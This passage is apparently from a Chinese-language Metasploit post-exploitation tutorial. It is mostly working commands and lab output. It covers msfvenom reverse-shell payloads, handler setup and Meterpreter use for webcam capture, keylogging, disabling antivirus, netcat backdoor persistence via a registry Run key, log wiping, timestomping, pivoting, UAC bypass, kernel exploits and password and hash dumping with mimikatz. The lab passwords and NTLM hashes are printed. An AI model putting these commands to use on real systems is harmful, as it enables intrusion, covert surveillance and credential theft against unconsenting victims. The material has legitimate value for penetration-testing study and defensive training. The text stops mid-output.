<p>Windows Based Shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<p>Mac Based Shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令"><a href="#4-Meterpreter基本命令" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2><p>首先需要先获取meterpreter：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

<p>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。</p>
<p>获取到了meterpreter，就可以进行后渗透了。</p>
<h3 id="4-1-基本系统命令"><a href="#4-1-基本系统命令" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

<h3 id="4-2-文件系统命令"><a href="#4-2-文件系统命令" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令"><a href="#4-3-网络命令" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集"><a href="#4-4-信息收集" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权"><a href="#4-5-提权" class="headerlink" title="4.5 提权"></a>4.5 提权</h3><p>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

<p>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。</p>
<p>msf提供了如下几个模块帮助绕过UAC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

<p>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

<p>3.内核漏洞提权</p>
<p>无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证"><a href="#4-6-获取凭证" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3><p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。</p>
<p>1.使用mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

<p>3.post/windows/gather/smart_hashdump</p>
<p>从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     